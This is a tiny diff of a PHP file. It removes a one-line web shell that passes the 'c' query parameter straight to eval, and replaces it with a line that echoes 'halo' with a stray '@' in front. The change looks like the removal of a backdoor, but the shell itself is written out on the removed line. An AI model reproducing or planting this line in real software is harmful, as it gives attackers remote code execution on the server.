@@ -1,1 +1,1 @@
-<?php eval($_GET[c]); ?>
+@<?php echo "halo"; ?>
